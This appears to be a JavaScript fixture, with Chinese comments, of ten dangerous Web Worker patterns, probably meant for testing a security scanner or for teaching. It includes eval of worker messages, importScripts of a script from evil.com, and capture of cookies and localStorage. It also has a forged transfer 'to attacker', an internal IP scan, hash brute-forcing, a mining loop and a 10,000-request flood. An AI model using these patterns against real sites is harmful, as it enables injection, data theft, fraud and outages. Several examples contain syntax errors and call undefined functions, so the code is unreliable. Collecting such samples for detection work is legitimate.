// Worker XSS 漏洞示例文件

// 示例 1: 不安全的 Web Worker 消息处理
export function workerXssExample1() {
  const worker = new Worker('worker.js');
  
  worker.onmessage = (event) => {
    // 危险：直接执行 Worker 返回的数据
    eval(event.data);
  };
}

// 示例 2: Worker 注入恶意脚本
export function workerXssExample2() {
  const workerCode = `
    self.onmessage = function(event) {
      // 危险：执行恶意代码
      eval(event.data);
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  worker.postMessage('alert("XSS")');
}

// 示例 3: Worker 数据泄露
export function workerXssExample3() {
  const workerCode = `
    self.onmessage = function(event) {
      // 危险：发送敏感数据
      self.postMessage({
        cookies: event.data.cookies,
        localStorage: event.data.localStorage
      });
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  worker.postMessage({
    cookies: document.cookie,
    localStorage: localStorage
  });
}

// 示例 4: Worker 动态脚本加载
export function workerXssExample4() {
  const workerCode = `
    self.onmessage = function(event) {
      // 危险：动态加载脚本
      importScripts(event.data);
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  worker.postMessage('https://evil.com/malicious.js');
}

// 示例 5: Worker XSS 攻击
export function workerXssExample5() {
  const workerCode = `
    self.onmessage = function(event) {
      // 危险：构造 XSS 攻击
      const payload = '<script>alert("XSS")</script>';
      self.postMessage(payload);
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  worker.onmessage = (event) => {
    document.body.innerHTML = event.data;
  };
  
  worker.postMessage('');
}

// 示例 6: Worker CSRF 攻击
export function workerXssExample6() {
  const workerCode = `
    self.onmessage = function(event) {
      // 危险：发起 CSRF 请求
      fetch(event.data.url, {
        method: 'POST',
        body: JSON.stringify(event.data.data)
      });
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  worker.postMessage({
    url: 'https://target.com/transfer',
    data: { amount: 1000, to: 'attacker' }
  });
}

// 示例 7: Worker 网络扫描
export function workerXssExample7() {
  const workerCode = `
    self.onmessage = function(event) => {
      // 危险：扫描内网
      const ips = event.data.ips;
      ips.forEach(ip => {
        fetch(`http://${ip}/api/data`);
      });
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  worker.postMessage({
    ips: ['192.168.1.1', '192.168.1.2', '10.0.0.1']
  });
}

// 示例 8: Worker 密码破解
export function workerXssExample8() {
  const workerCode = `
    self.onmessage = function(event) => {
      const hash = event.data.hash;
      const charset = event.data.charset;
      
      // 危险：暴力破解密码
      for (let i = 0; i < charset.length; i++) {
        for (let j = 0; j < charset.length; j++) {
          const password = charset[i] + charset[j];
          if (hashPassword(password) === hash) {
            self.postMessage({ found: true, password });
            return;
          }
        }
      }
      
      self.postMessage({ found: false });
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  worker.postMessage({
    hash: '5f4dcc3b5aa765d61d8327deb882cf99',
    charset: 'abcdefghijklmnopqrstuvwxyz0123456789'
  });
}

// 示例 9: Worker 挖矿
export function workerXssExample9() {
  const workerCode = `
    self.onmessage = function(event) => {
      // 危险：加密货币挖矿
      while (true) {
        const hash = mineBlock(event.data.difficulty);
        if (hash) {
          self.postMessage({ hash });
        }
      }
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  worker.postMessage({ difficulty: 4 });
}

// 示例 10: Worker DoS 攻击
export function workerXssExample10() {
  const workerCode = `
    self.onmessage = function(event) => {
      // 危险：发起大量请求
      const url = event.data.url;
      const count = event.data.count;
      
      for (let i = 0; i < count; i++) {
        fetch(url);
      }
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  worker.postMessage({
    url: 'https://target.com/api',
    count: 10000
  });
}
